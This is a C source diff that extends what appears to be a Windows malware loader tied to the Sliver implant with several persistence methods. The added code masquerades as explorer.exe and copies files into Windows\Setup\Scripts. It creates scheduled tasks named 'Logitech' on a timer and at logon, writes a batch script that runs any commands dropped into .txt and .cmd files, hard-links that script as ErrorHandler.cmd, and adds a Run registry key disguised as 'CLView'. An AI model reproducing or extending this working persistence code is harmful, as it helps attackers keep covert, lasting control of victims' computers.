@@ -290,13 +290,18 @@ BOOL PersistenceMethod1
 
 	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
 	SecureZeroMemory(OldPath, sizeof(OldPath));
-
 	GetWindowsDirectoryW(wszWindowsPath, _countof(wszWindowsPath));
 	lstrcatW(wszWindowsPath, L"\\Setup\\Scripts");
 	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
 	lstrcatW(wszExplorerPath, L"\\explorer.exe");
 	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
 	RestoreProcessPath = TRUE;
+	if (!IsFolderExist(wszWindowsPath)) {
+		if (!MasqueradedCreateDirectoryFileCOM(wszWindowsPath)) {
+			goto CLEANUP;
+		}
+	}
+
 	if (!MasqueradedMoveCopyDirectoryFileCOM(lpPath, wszWindowsPath, FALSE)) {
 		goto CLEANUP;
 	}
@@ -326,8 +331,9 @@ BOOL Persistence
 	LPWSTR lpLockPath = NULL;
 	LPSTR lpMainExecutable = NULL;
 
-	lpLockPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(pConfig->lpUniqueName) + 6);
-	lstrcatW(lpLockPath, L"\\");
+	lpLockPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(pConfig->lpUniqueName) + 20);
+	lstrcatW(lpLockPath, L"\\Scripts\\");
+	CreateDirectoryW(lpLockPath, NULL);
 	lstrcatW(lpLockPath, pConfig->lpUniqueName);
 	lstrcatW(lpLockPath, L".txt");
 	if (IsFileExist(lpLockPath)) {
@@ -344,7 +350,13 @@ BOOL Persistence
 	lpSliverPath = ConvertWcharToChar(pConfig->lpSliverPath);
 	lpTemp = StrAppendA(lpSliverPath, "\\Scripts");
 	lpCommand = StrCatExA(lpCommand, lpTemp);
-	lpCommand = StrCatExA(lpCommand, "\n@schtasks /query /tn Logitech 1>nul 2>nul\n@if \"%ERRORLEVEL%\"==\"1\" schtasks /create /sc MINUTE /tn Logitech /tr %WINDIR%\\System32\\oobe\\oobeldr.exe /mo 5\n@for %%a in (*.txt) do (type %%a & if not \"% ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.cmd) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (%%a 1>%%b.out 2>%%b.err) & del %%a)");
+	FREE(lpTemp);
+	//lpCommand = StrCatExA(lpCommand, "\n@schtasks /query /tn Logitech 1>nul 2>nul\n@if \"%ERRORLEVEL%\"==\"1\" schtasks /create /sc MINUTE /tn Logitech /tr %WINDIR%\\System32\\oobe\\oobeldr.exe /mo 5\n@for %%a in (*.txt) do (type %%a & if not \"%ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.cmd) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (%%a 1>%%b.out 2>%%b.err) & del %%a)");
+	if (!CreateTimeTriggerTask(L"Logitech", L"\\", L"%WINDIR%\\System32\\oobe\\oobeldr.exe", L"PT7M")) {
+		goto CLEANUP;
+	}
+
+	lpCommand = StrCatExA(lpCommand, "\n@for %%a in (*.txt) do (type %%a & if not \"%ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.cmd) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (%%a 1>%%b.out 2>%%b.err) & del %%a)");
 	lpTemp3 = StrAppendW(pConfig->lpSliverPath, L"\\run.cmd");
 	if (!WriteToFile(lpTemp3, lpCommand, lstrlenA(lpCommand))) {
 		goto CLEANUP;
@@ -359,6 +371,7 @@ BOOL Persistence
 	lpErrorHandlerPath = ALLOC(MAX_PATH * sizeof(WCHAR));
 	GetTempPathW(MAX_PATH, lpErrorHandlerPath);
 	lpErrorHandlerPath = StrCatExW(lpErrorHandlerPath, L"ErrorHandler.cmd");
+	DeleteFileW(lpErrorHandlerPath);
 	if (!CreateHardLinkW(lpErrorHandlerPath, lpTemp3, NULL)) {
 		LOG_ERROR("CreateHardLinkW", GetLastError());
 		goto CLEANUP;
@@ -389,6 +402,65 @@ CLEANUP:
 	FREE(lpSliverPath);
 	FREE(lpTemp3);
 	FREE(lpLockPath);
+
+	return Result;
+}
+
+BOOL Persistence2
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	BOOL Result = FALSE;
+
+	if (!CreateAtLogonTask(L"Logitech", L"\\", pConfig->lpMainExecutable)) {
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	return Result;
+}
+
+BOOL Persistence3
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	HKEY hKey = NULL;
+	BOOL Result = FALSE;
+	LSTATUS Status = ERROR_SUCCESS;
+	PBYTE pData = NULL;
+	DWORD dwRegType = 0;
+	WCHAR wszPath[MAX_PATH];
+	DWORD cbData = _countof(wszPath) * sizeof(WCHAR);
+
+	Status = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &hKey);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegOpenKeyExW", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegQueryValueExW(hKey, L"CLView", NULL, &dwRegType, wszPath, &cbData);
+	if (Status != ERROR_SUCCESS) {
+		if (Status == ERROR_FILE_NOT_FOUND) {
+			Status = RegSetValueExW(hKey, L"CLView", 0, REG_SZ, pConfig->lpMainExecutable, (lstrlenW(pConfig->lpMainExecutable) + 1) * sizeof(WCHAR));
+			if (Status != ERROR_SUCCESS) {
+				LOG_ERROR("RegSetValueExW", Status);
+				goto CLEANUP;
+			}
+		}
+		else {
+			LOG_ERROR("RegQueryValueExW", Status);
+			goto CLEANUP;
+		}
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
 
 	return Result;
 }
